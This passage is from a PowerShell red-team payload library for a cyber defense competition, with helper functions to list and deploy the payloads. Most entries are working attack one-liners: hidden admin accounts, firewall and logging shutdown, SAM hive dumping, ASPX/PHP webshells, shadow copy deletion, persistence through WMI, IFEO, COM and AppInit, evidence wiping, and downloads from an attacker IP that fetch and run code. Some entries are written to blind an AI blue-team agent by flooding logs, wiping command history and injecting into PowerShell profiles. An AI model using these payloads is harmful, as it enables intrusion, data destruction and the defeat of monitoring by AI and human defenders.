        Notes = 'Superior GDI replacement for the console-based MEME-004. Uses a persistent Bitmap buffer with alpha-fade (25/255 per frame) instead of clear, creating genuine trailing glow. 46 Katakana chars plus standard alphanumeric/symbol set for authentic look. Per-column randomized speed (0.3-1.5x) and trail length (8-28 chars). White leading character + green second character + faded green trail. INTERACTIVE SESSION ONLY — use -Persist registry. Kill switch: Ctrl+Shift+Q.'
    }

    # ════════════════════════════════════════════════════════════
    # 🧩 COMBINED / MULTI-STAGE
    # ════════════════════════════════════════════════════════════

    'COMBO-001' = @{
        Desc  = 'Full initial access package: disable FW + enable RDP + create admin + disable logging'
        Cmd   = 'cmd /c "netsh advfirewall set allprofiles state off & net user svcAdmin Pa$$w0rd2026! /add & net localgroup Administrators svcAdmin /add"; Set-ItemProperty ''HKLM:\System\CurrentControlSet\Control\Terminal Server'' -Name fDenyTSConnections -Value 0; $sb=''HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging''; if(!(Test-Path $sb)){New-Item -Path $sb -Force|Out-Null}; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force'
        Notes = 'The "I just got on this box" package — firewall down, admin created, RDP enabled, logging disabled'
    }

    'COMBO-002' = @{
        Desc  = 'Stealth package: add FW rules + hidden admin + Defender exclusions + disable logging'
        Cmd   = 'cmd /c "netsh advfirewall firewall add rule name=""Core Networking - DNS (UDP-In)"" dir=in action=allow protocol=tcp localport=3389,5985,445 enable=yes & net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"; $p=''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList''; if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}; New-ItemProperty $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null; Add-MpPreference -ExclusionPath ''C:\ProgramData'' -Force; $sb=''HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging''; if(!(Test-Path $sb)){New-Item -Path $sb -Force|Out-Null}; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force'
        Notes = 'Quieter version of COMBO-001: FW rules instead of disable, hidden user, Defender exclusions'
    }

    'COMBO-003' = @{
        Desc  = 'Recon + exfil package: enumerate everything + stage for pickup'
        Cmd   = '$o=@("=== $(hostname) / $(whoami) / $(Get-Date) ===","=== ADMINS ==="); $o+=cmd /c "net localgroup Administrators"; $o+="=== NETWORK ==="; $o+=ipconfig /all; $o+="=== CONNECTIONS ==="; $o+=netstat -an; $o+="=== DOMAIN ==="; $o+=cmd /c "net group ""Domain Admins"" /domain 2>nul"; $o+="=== TASKS ==="; $o+=cmd /c "schtasks /query /fo CSV /v 2>nul | findstr /i /v ""disable"""; $o|Out-File C:\ProgramData\r.txt -Force; cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y 2>nul"'
        Notes = 'Recon + credential dump in one payload — everything lands in C:\ProgramData ready for exfil'
    }

    'COMBO-004' = @{
        Desc  = 'AI blue team counter-package — log flooding + log truncation + prefetch wipe + PS history disable + PS profile inject'
        Cmd   = '# Step 1: Flood logs with noise to baseline-poison AI analysis 1..2000|ForEach-Object{Write-EventLog -LogName Security -Source "SecurityCenter" -EventId 4624 -Message "Normal authentication event - logon type 3 - NETWORK" -EntryType Information -EA 0}; # Step 2: Shrink logs to near-zero @("Security","System","Application","Microsoft-Windows-PowerShell/Operational")|ForEach-Object{try{wevtutil sl $_ /ms:1024 /rt:true 2>$null}catch{}}; # Step 3: Nuke PS history $h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; if(Test-Path $h){Clear-Content $h -Force}; Set-PSReadlineOption -HistorySaveStyle SaveNothing -EA 0; # Step 4: Clear prefetch cmd /c "del /F /Q C:\Windows\Prefetch\*.pf 2>nul"; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name EnablePrefetcher -Value 0 -Type DWord -Force -EA 0'
        Notes = 'Designed specifically for WRCCDC Finals where Claude/Claude Code is the blue team. Floods the security log with 2000 baseline events to poison any ML-based anomaly detection, shrinks all logs to 1KB so no history accumulates, wipes PS command history (retroactive and future), and disables prefetch. Claude Code depends heavily on log analysis and PS history for remediation decisions. This payload reduces its information to near-zero. Run at initial access, then again via periodic ADS task every 10 minutes.'
    }

    'COMBO-005' = @{
        Desc  = 'Full persistence layering — ADS + PS profile + WMI + registry run + scheduled task (5 independent layers)'
        Cmd   = '$pl=IEX(gc "$env:ProgramData\cache.dat:s" -Raw -EA 0 2>$null); # Layer 1 (registry) already set by ADS dropper; # Layer 2: WMI subscription $q="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System''"; try{$f=([wmiclass]"root\subscription:__EventFilter").CreateInstance();$f.Name="WindowsPerf";$f.EventNameSpace="root\cimv2";$f.QueryLanguage="WQL";$f.Query=$q;$f.Put()|Out-Null; $c=([wmiclass]"root\subscription:CommandLineEventConsumer").CreateInstance();$c.Name="WindowsPerf";$c.CommandLineTemplate="powershell.exe -NoP -W Hidden -C `"IEX(gc ''$env:ProgramData\cache.dat:s'' -Raw)`"";$c.Put()|Out-Null; $b=([wmiclass]"root\subscription:__FilterToConsumerBinding").CreateInstance();$b.Filter=$f.__PATH;$b.Consumer=$c.__PATH;$b.Put()|Out-Null}catch{}; # Layer 3: IFEO debugger hijack on commonly-run blue-team tools $tgt="powershell_ise.exe"; $p="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$tgt"; New-Item $p -Force|Out-Null; Set-ItemProperty $p -Name Debugger -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc ''$env:ProgramData\cache.dat:s'' -Raw)`" -EA 0 --"'
        Notes = 'REPLACE $env:ProgramData\cache.dat:s with your actual ADS path. Adds WMI permanent event subscription (fires every 60s on performance counter change, survives task cleanup) and IFEO debugger hijack on powershell_ise.exe (fires when blue team opens PS ISE). Combined with ADS task (Layer 1) and registry Run key (Layer 2 from ADS dropper), and PS profile injection (NOVEL-008), this gives 4-5 independent persistence mechanisms that all require different cleanup procedures. Blue team fixing one path still leaves four active.'
    }

    # ════════════════════════════════════════════════════════════
    # 💥 IMPACT
    # Payloads that directly affect service availability or scoring.
    # ════════════════════════════════════════════════════════════

    'IMPACT-001' = @{
        Desc  = 'Persistent hosts file poisoning — redirects blue team monitoring and update URLs to attack box'
        Cmd   = '$h="$env:SystemRoot\System32\drivers\etc\hosts"; $entries=@("10.0.0.100 monitoring.corp.local","10.0.0.100 siem.corp.local","10.0.0.100 splunk.corp.local","10.0.0.100 update.microsoft.com","10.0.0.100 windowsupdate.microsoft.com"); $current=Get-Content $h -Raw -EA 0; $entries|Where-Object{$current -notmatch ($_ -split " ")[1]}|ForEach-Object{Add-Content $h "`n$_" -EA 0}'
        Notes = 'Replace 10.0.0.100 with your attack box IP. Appends only entries that are not already present (idempotent — safe to re-run from periodic task). When blue team tries to access their monitoring dashboard or push Windows Updates, they hit your box instead. Update the entries list to match the actual WRCCDC monitoring infrastructure. Combine with a Python HTTP server serving fake 200 OK responses to prevent suspicion.'
    }

    'IMPACT-002' = @{
        Desc  = 'Web defacement — overwrite default index page for IIS, Apache, nginx, XAMPP, and WAMP'
        Cmd   = '$roots=@("C:\inetpub\wwwroot","C:\xampp\htdocs","C:\wamp\www","C:\wamp64\www","C:\nginx\html","C:\Apache24\htdocs"); $deface="<html><head><title>Compromised</title></head><body style=""background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%""><h1>&#x1F480; Red Team Was Here &#x1F480;</h1><p>Apparition Delivery System v2.4</p><p>Hostname: " + $env:COMPUTERNAME + " | " + (Get-Date -f "yyyy-MM-dd HH:mm") + "</p></body></html>"; $roots|Where-Object{Test-Path $_}|ForEach-Object{$idx=Get-ChildItem $_ -Filter "index.*" -EA 0|Select-Object -First 1; $target=if($idx){$idx.FullName}else{"$_\index.html"}; $deface|Out-File $target -Force -Encoding UTF8 -EA 0}'
        Notes = 'Covers IIS, XAMPP, WAMP, nginx, and Apache default roots. Overwrites whatever index file exists; creates index.html if none found. Run from periodic ADS task so re-execution restores the deface after blue team reverts it. The defacement embeds live hostname and timestamp so each load shows current proof-of-compromise. Adjust message as desired.'
    }

    'IMPACT-003' = @{
        Desc  = 'Shadow copy deletion — destroys all VSS snapshots, prevents system restore and backup recovery'
        Cmd   = 'cmd /c "vssadmin delete shadows /all /quiet 2>nul"; Get-WmiObject Win32_ShadowCopy -EA 0 | ForEach-Object { $_.Delete() }; cmd /c "wmic shadowcopy delete 2>nul"; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -Name DisableSR -Value 1 -Type DWord -Force -EA 0; cmd /c "sc config VSS start= disabled 2>nul & sc config swprv start= disabled 2>nul"'
        Notes = 'Three-redundant shadow copy deletion (vssadmin, WMI, wmic) plus registry SR disable plus disabling the VSS and swprv services. Blue team cannot restore to a clean snapshot or use Previous Versions. Also disables the VSS service so new snapshots cannot be created while this is deployed. Critical to deploy early — before blue team creates a clean baseline snapshot.'
    }

    'IMPACT-004' = @{
        Desc  = 'DNS cache poison + disable DNS Client cache (breaks name resolution for all processes)'
        Cmd   = 'cmd /c "dnscmd /clearcache 2>nul"; $dnsCache="HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters"; if(!(Test-Path $dnsCache)){New-Item $dnsCache -Force|Out-Null}; Set-ItemProperty $dnsCache -Name MaxCacheTtl -Value 0 -Type DWord -Force; Set-ItemProperty $dnsCache -Name MaxNegativeCacheTtl -Value 0 -Type DWord -Force; cmd /c "net stop dnscache /y 2>nul & sc config dnscache start= disabled 2>nul"'
        Notes = 'Sets DNS client cache TTL to 0 (every DNS lookup goes to the wire) and stops the DNS cache service. On its own this is moderately disruptive. Combined with IMPACT-001 (hosts file poisoning) it ensures our poisoned entries take effect immediately without waiting for cache expiry. On a DNS server, also run: cmd /c "dnscmd /clearcache" to flush the server-side cache.'
    }

    'IMPACT-005' = @{
        Desc  = 'Deploy ASPX/PHP webshell to IIS and common web roots for persistent HTTP access'
        Cmd   = '$aspx=''<%@ Page Language="C#" %><% System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());p.WaitForExit();%>''; $php=''<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);}?>''; $roots=@("C:\inetpub\wwwroot","C:\xampp\htdocs","C:\wamp\www","C:\wamp64\www"); $roots|Where-Object{Test-Path $_}|ForEach-Object{$aspx|Out-File "$_\health.aspx" -Force -Encoding UTF8 -EA 0; $php|Out-File "$_\health.php" -Force -Encoding UTF8 -EA 0}'
        Notes = 'Drops health.aspx (C# code-behind RCE) and health.php to all detected web roots. Access via: http://TARGET/health.aspx?c=whoami or http://TARGET/health.php?c=whoami. Named "health" to blend in with load balancer health checks that blue teams often whitelist. Use ADS periodic task so the webshell is re-deployed if deleted. Provides persistent HTTP-based access independent of WinRM, RDP, or your ADS task infrastructure.'
    }

    # ════════════════════════════════════════════════════════════
    # 🧹 ANTI-FORENSICS
    # Payloads that destroy evidence and disrupt analysis.
    # ════════════════════════════════════════════════════════════

    'ANTI-001' = @{
        Desc  = 'Destroy Defender threat history, quarantine store, and signature database cache'
        Cmd   = 'Stop-Service WinDefend -Force -EA 0; @("C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory","C:\ProgramData\Microsoft\Windows Defender\Quarantine","C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache*")|ForEach-Object{Remove-Item $_ -Recurse -Force -EA 0}; Start-Service WinDefend -EA 0'
        Notes = 'Wipes all Defender detection history and quarantine entries. Removes the signature cache so Defender has to rebuild it on next scan (slows blue team scans temporarily). Stop-Service + cleanup + Start-Service ensures the files are not locked. Any previously flagged files are no longer flagged in history, making forensic reconstruction harder.'
    }

    'ANTI-002' = @{
        Desc  = 'Nuke Windows Search index (destroys file-content searchability for forensic analysis)'
        Cmd   = 'Stop-Service WSearch -Force -EA 0; cmd /c "sc config WSearch start= disabled 2>nul"; Remove-Item -Path "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\*" -Recurse -Force -EA 0; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Name PreventIndexingOutlook -Value 1 -Type DWord -Force -EA 0'
        Notes = 'Stops and disables Windows Search, then destroys the entire index database. Blue team and AI analyst cannot use Windows Search or Windows File Explorer search to find ADS files, suspicious scripts, or other artifacts by content. Rebuilding the index takes 30-60 minutes and requires the service to be re-enabled first.'
    }

    'ANTI-003' = @{
        Desc  = 'Flood event logs with 5000 benign-looking authentication events (overwhelm AI analysis)'
        Cmd   = '$src="Microsoft-Windows-Security-Auditing"; 1..5000|ForEach-Object{try{$e=New-Object System.Diagnostics.EventLog("Security");$e.Source=$src;Write-EventLog -LogName Security -Source "SecurityCenter" -EventId 4624 -Message "An account was successfully logged on. Subject: Security ID: SYSTEM Account Name: SYSTEM Logon Type: 5" -EntryType Information -EA 0}catch{}};Write-Host "Flooded 5000 events"'
        Notes = 'Generates 5000 Event ID 4624 (successful logon) entries in the Security log. This drowns any anomalous events in noise and makes timeline reconstruction via log analysis extremely slow — even for Claude Code. Particularly effective because 4624 is one of the most common events analysts filter for. Run once at initial access and again periodically. Combine with DEF-012 (1KB log size) so the real events get pushed out immediately after flooding.'
    }

    # ════════════════════════════════════════════════════════════
    # 🔬 NOVEL / EXPERIMENTAL
    # ════════════════════════════════════════════════════════════

    'NOVEL-001' = @{
        Desc  = 'DLL search order hijack prep (plant DLL in PATH-priority location)'
        Cmd   = '$w=New-Object Net.WebClient;$w.DownloadFile(''http://ATTACKER_IP:8080/version.dll'',"$env:WINDIR\version.dll")'
        Notes = 'Replace ATTACKER_IP — drops a malicious version.dll where many apps search first. Build DLL on Kali with msfvenom.'
    }

    'NOVEL-002' = @{
        Desc  = 'COM object hijack persistence (survives task cleanup)'
        Cmd   = '$clsid=''{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}''; $p="HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"; New-Item -Path $p -Force|Out-Null; Set-ItemProperty $p -Name ''(Default)'' -Value ''C:\ProgramData\update.dll'' -Force; Set-ItemProperty $p -Name ThreadingModel -Value ''Both'' -Force'
        Notes = 'Hijacks a COM CLSID that explorer.exe loads — provides persistence without scheduled tasks or Run keys. SYSTEM CONTEXT WARNING: Writes to HKCU which resolves to SYSTEM hive from Task Scheduler. COM hijack will not trigger for interactive users. Rewrite to use HKU:\<SID> per-user or deploy from interactive session.'
    }

    'NOVEL-003' = @{
        Desc  = 'WMI event subscription persistence (another persistence layer)'
        Cmd   = '$q="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 120"; $f=[wmiclass]"\\.\root\subscription:__EventFilterToConsumerBinding"; $filter=([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance(); $filter.Name="WindowsUpdateCheck"; $filter.EventNamespace="root\cimv2"; $filter.QueryLanguage="WQL"; $filter.Query=$q; $filter.Put()|Out-Null; $consumer=([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance(); $consumer.Name="WindowsUpdateCheck"; $consumer.CommandLineTemplate="powershell.exe -NoP -W Hidden -C ""IEX(gc ''C:\ProgramData\update.ps1'' -Raw)"""; $consumer.Put()|Out-Null; $bind=$f.CreateInstance(); $bind.Filter=$filter.__PATH; $bind.Consumer=$consumer.__PATH; $bind.Put()|Out-Null'
        Notes = 'WMI permanent event subscription — fires 2 min after boot. Survives removal of scheduled tasks AND Run keys.'
    }

    'NOVEL-004' = @{
        Desc  = 'Screensaver hijack persistence (triggers on user idle)'
        Cmd   = '$ss=''HKCU:\Control Panel\Desktop''; Set-ItemProperty $ss -Name SCRNSAVE.EXE -Value ''powershell.exe'' -Force; Set-ItemProperty $ss -Name ScreenSaveActive -Value ''1'' -Force; Set-ItemProperty $ss -Name ScreenSaveTimeOut -Value ''300'' -Force; Set-ItemProperty $ss -Name ScreenSaverIsSecure -Value ''0'' -Force'
        Notes = 'Sets PowerShell as the screensaver — when user is idle for 5 min, PS launches. Combine with a script at a known path. SYSTEM CONTEXT WARNING: Writes to HKCU which resolves to SYSTEM hive from Task Scheduler. Screensaver hijack will not affect interactive users. Rewrite to use HKU:\<SID> per-user or deploy from interactive session.'
    }

    'NOVEL-005' = @{
        Desc  = 'AppInit_DLLs injection (loads DLL into every user-mode process)'
        Cmd   = 'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'' -Name AppInit_DLLs -Value ''C:\ProgramData\helper.dll'' -Type String -Force; Set-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'' -Name LoadAppInit_DLLs -Value 1 -Type DWord -Force'
        Notes = 'Injects a DLL into every process that loads user32.dll. Extremely persistent — survives nearly all cleanup.'
    }

    'NOVEL-006' = @{
        Desc  = 'Image File Execution Options debugger (hijack common tool)'
        Cmd   = '$target=''notepad.exe''; $p="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target"; New-Item -Path $p -Force|Out-Null; Set-ItemProperty $p -Name Debugger -Value ''powershell.exe -NoP -W Hidden -File C:\ProgramData\update.ps1'' -Force'
        Notes = 'When user runs notepad, it actually runs our script. Change target to any executable blue team might use. SYSTEM CONTEXT CAVEAT: The HKLM write works fine from SYSTEM, but the hijacked process runs as the triggering user, not SYSTEM. This is expected behavior — just note the context switch.'
    }

    'NOVEL-007' = @{
        Desc  = 'Print Monitor DLL persistence (very rare, loads at SYSTEM boot)'
        Cmd   = 'New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\WindowsCorePrinter'' -Name Driver -Value ''helper.dll'' -PropertyType String -Force'
        Notes = 'Registers a print monitor DLL — loaded by spoolsv.exe at SYSTEM level on every boot. Extremely rare in blue team detection playbooks.'
    }

    'NOVEL-008' = @{
        Desc  = 'PowerShell profile injection — payload fires every time any PowerShell session starts (including Claude Code sessions)'
        Cmd   = '$adsPath="PLACEHOLDER_HP:PLACEHOLDER_SN"; $inject="`nif(`$env:USERNAME -ne ''SYSTEM''){try{IEX(gc ''$adsPath'' -Raw -EA 0)}catch{}}"; @($PROFILE.AllUsersAllHosts,$PROFILE.AllUsersCurrentHost,$PROFILE.CurrentUserAllHosts)|ForEach-Object{$dir=Split-Path $_ -Parent;if($dir -and !(Test-Path $dir)){ni $dir -ItemType Directory -Force|Out-Null}; Add-Content $_ $inject -Force -EA 0}'
        Notes = 'REPLACE PLACEHOLDER_HP and PLACEHOLDER_SN with your actual ADS host path and stream name before deploying. Injects a payload call into AllUsersAllHosts and AllUsersCurrentHost profiles — fires for EVERY user, EVERY PowerShell session. Exceptionally potent against Claude Code (blue team AI) which opens new PS sessions constantly. Each new PS window re-executes your payload. The SYSTEM exclusion prevents feedback loops from your own ADS tasks. Cleanup: remove the injected line from profile files.'
    }

    'NOVEL-009' = @{
        Desc  = 'Netsh portproxy — forward external port to internal service (pivoting without new connections)'
        Cmd   = 'cmd /c "netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=445 connectaddress=127.0.0.1 2>nul & netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1 2>nul & netsh advfirewall firewall add rule name=""Windows HTTPS Service"" dir=in action=allow protocol=tcp localport=8443,8080 enable=yes 2>nul"'
        Notes = 'Forwards port 8443 → localhost:445 (SMB via HTTPS-looking port) and port 8080 → localhost:3389 (RDP via HTTP-looking port). Portproxy rules survive reboot and appear in very few blue team checklists. Connect via: xfreerdp /v:TARGET:8080 or smbclient //TARGET:8443/C$. The firewall rule names look legitimate. List active rules: netsh interface portproxy show all.'
    }

    'NOVEL-010' = @{
        Desc  = 'Exact Windows task name camouflage — register task under real Microsoft task path with real-looking name'
        Cmd   = '$legitimatePaths=@("\Microsoft\Windows\UpdateOrchestrator\","\Microsoft\Windows\Defrag\","\Microsoft\Windows\DiskCleanup\","\Microsoft\Windows\MUI\"); $legitimateNames=@("Schedule Scan","ScheduledDefrag","SilentCleanup","LPRemove"); $idx=Get-Random -Maximum $legitimatePaths.Count; $taskPath=$legitimatePaths[$idx]; $taskName=$legitimateNames[$idx]; Write-Host "Use task path: $taskPath, name: $taskName with Register-ScheduledTask -TaskPath parameter"'
        Notes = 'Generates a real Microsoft task path+name combo. Use the output values with Register-ScheduledTask -TaskPath (value from $taskPath) -TaskName (value from $taskName). A blue team scanning for suspicious tasks will see e.g. \Microsoft\Windows\UpdateOrchestrator\Schedule Scan — a real Windows task name in the real Windows task path. They will skip it. Note: the real task may already exist; this creates a second one with the same name in the same path, which Windows allows (silently overwrites). Test your target first.'
    }

    'NOVEL-011' = @{
        Desc  = 'Blue team trap — modify blue team cleanup scripts to re-deploy instead of clean'
        Cmd   = '$searchPaths=@("$env:USERPROFILE\Desktop","$env:PUBLIC\Desktop","C:\Users\Administrator\Desktop","C:\scripts","C:\tools"); $trap="`n# Maintenance check`ntry{if(Test-Connection 10.0.0.100 -Count 1 -Quiet -EA 0){(New-Object Net.WebClient).DownloadString(''http://10.0.0.100:8080/agent.ps1'')|IEX}}catch{}"; $searchPaths|ForEach-Object{Get-ChildItem $_ -Filter "*.ps1" -EA 0|Where-Object{$_.Name -match "(clean|remediat|remove|fix|restore|blue)"i}|ForEach-Object{Add-Content $_.FullName $trap -EA 0}}'
        Notes = 'REPLACE 10.0.0.100 with your attack box IP. Searches for PS1 scripts with names matching cleanup/remediation patterns on the blue team desktop and common script directories, then appends a beacon call to each. When the blue team runs their own cleanup script, it re-establishes C2. The appended code only triggers if your attack box is reachable (Test-Connection gate) — stays dormant otherwise. Subtle and devastating.'
    }

    'NOVEL-012' = @{
        Desc  = 'Time-bomb — deploy dormant ADS payload that activates at a specific datetime'
        Cmd   = '$activateAt=[DateTime]"2026-04-15 09:00:00"; $adsPath="C:\ProgramData\Microsoft\Windows\WER\Temp\diag_report.dat"; $sn=[char]0x200B+[char]0x200C; $bomb="while((Get-Date) -lt [DateTime]''$activateAt''){Start-Sleep -Seconds 300};IEX(gc ''${adsPath}:${sn}'' -Raw)"; $bomb|sc "$adsPath`:dormant" -Force'
        Notes = 'REPLACE the activateAt datetime and adsPath/sn with your actual deployment values. Write this as the payload to an ADS stream named "dormant" — it sleeps until the competition activation time, then reads and executes your real payload from the zero-width stream. Deploy during initial access; blue team sweeps the box and finds nothing suspicious (the dormant stream just looks like a file). At competition start the real payload fires with zero blue team awareness of deployment time. Change the target date to match WRCCDC Finals day.'
    }
}

# ============================================================
# DISPLAY / UTILITY FUNCTIONS
# ============================================================

function Show-Payloads {
    <#
    .SYNOPSIS
        Display all payloads in a formatted table
    #>
    Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║ CCDC Payload Library — Apparition Delivery System         ║" -ForegroundColor Cyan
    Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan

    $categories = [ordered]@{
        'FW'    = '🔥 Firewall Manipulation'
        'RDP'   = '🖥️  RDP Enablement'
        'USR'   = '👤 User Creation / Privilege Escalation'
        'SVC'   = '🔧 Service Manipulation'
        'C2'    = '📡 C2 / Beaconing'
        'CRED'  = '🔑 Credential Access'
        'DEF'   = '🛡️  Defense Evasion'
        'RECON' = '🔍 Reconnaissance'
        'LAT'   = '🌐 Lateral Movement Prep'
        'EXFIL' = '📁 Data Exfiltration'
        'FUN'   = '🎮 Impact / Fun'
        'MEME'  = '🃏 Meme / Entertainment'
        'COMBO' = '🧩 Combined / Multi-Stage'
        'NOVEL' = '🔬 Novel / Experimental'
        'IMPACT' = '💥 Impact (Service/Score Disruption)'
        'ANTI'   = '🧹 Anti-Forensics'
    }

    foreach ($cat in $categories.GetEnumerator()) {
        Write-Host "  $($cat.Value)" -ForegroundColor Yellow
        $Payloads.GetEnumerator() | Where-Object { $_.Key -match "^$($cat.Key)-" } | ForEach-Object {
            Write-Host "    $($_.Key)" -ForegroundColor White -NoNewline
            Write-Host " — $($_.Value.Desc)" -ForegroundColor Gray
        }
        Write-Host ""
    }

    Write-Host "  Total: $($Payloads.Count) payloads" -ForegroundColor Green
    Write-Host "  Usage: `$Payloads['FW-002'].Cmd | clip  (copy to clipboard)" -ForegroundColor DarkGray
    Write-Host ""
}

function Get-Payload {
    <#
    .SYNOPSIS
        Get a payload by ID and optionally copy to clipboard
    .EXAMPLE
        Get-Payload FW-002
        Get-Payload FW-002 -Copy
    #>
    param(
        [Parameter(Mandatory)][string]$Id,
        [switch]$Copy
    )

    if (-not $Payloads.Contains($Id)) {
        Write-Host "Unknown payload ID: $Id" -ForegroundColor Red
        Write-Host "Available: $($Payloads.Keys -join ', ')" -ForegroundColor Gray
        return
    }

    $p = $Payloads[$Id]
    Write-Host "`n[$Id] $($p.Desc)" -ForegroundColor Cyan
    Write-Host "Notes: $($p.Notes)" -ForegroundColor DarkGray
    Write-Host "`nCommand:" -ForegroundColor Yellow
    Write-Host $p.Cmd -ForegroundColor White

    if ($Copy) {
        $p.Cmd | Set-Clipboard
        Write-Host "`n[+] Copied to clipboard" -ForegroundColor Green
    }

    Write-Host ""
    return $p.Cmd
}

function Deploy-Payload {
    <#
    .SYNOPSIS
        Generate ADS-OneLiner deployment for a library payload
    .EXAMPLE
        Deploy-Payload -Id FW-002 -Encrypt -Randomize -InstanceCount 3
    .NOTES
        Wraps ADS-OneLiner.ps1 with the selected payload
    #>
    param(
        [Parameter(Mandatory)][string]$Id,
        [switch]$Encrypt,
        [switch]$Randomize,
        [switch]$ZeroWidthStreams,
        [switch]$UseDeepPlacement,
        [int]$InstanceCount = 1,
        [int]$CreateDecoys = 0,
        [string]$OutputFile
    )

    if (-not $Payloads.Contains($Id)) {
        Write-Host "Unknown payload ID: $Id" -ForegroundColor Red
        return
    }

    $payload = $Payloads[$Id]
    Write-Host "[*] Deploying $Id : $($payload.Desc)" -ForegroundColor Cyan

    # Locate ADS-OneLiner.ps1
    $oneLinerPaths = @(
        (Join-Path $PSScriptRoot '../src/ADS-OneLiner.ps1')
        (Join-Path $PSScriptRoot 'ADS-OneLiner.ps1')
        './src/ADS-OneLiner.ps1'
    )

    $oneLinerPath = $null
    foreach ($p in $oneLinerPaths) {
        if (Test-Path $p) { $oneLinerPath = $p; break }
    }

    if (-not $oneLinerPath) {
        Write-Host "[-] ADS-OneLiner.ps1 not found" -ForegroundColor Red
        Write-Host "    Run from project root or place this file in payloads/" -ForegroundColor Gray
        return
    }

    $params = @{
        Payload = $payload.Cmd
        Encrypt = $Encrypt
        Randomize = $Randomize
        ZeroWidthStreams = $ZeroWidthStreams
        UseDeepPlacement = $UseDeepPlacement
        InstanceCount = $InstanceCount
        CreateDecoys = $CreateDecoys
    }

    if ($OutputFile) { $params.OutputFile = $OutputFile }

    & $oneLinerPath @params
}

# ============================================================
# AUTO-DISPLAY WHEN SOURCED
# ============================================================

# If run directly (not dot-sourced), show the library
if ($MyInvocation.InvocationName -ne '.') {
    Show-Payloads
}
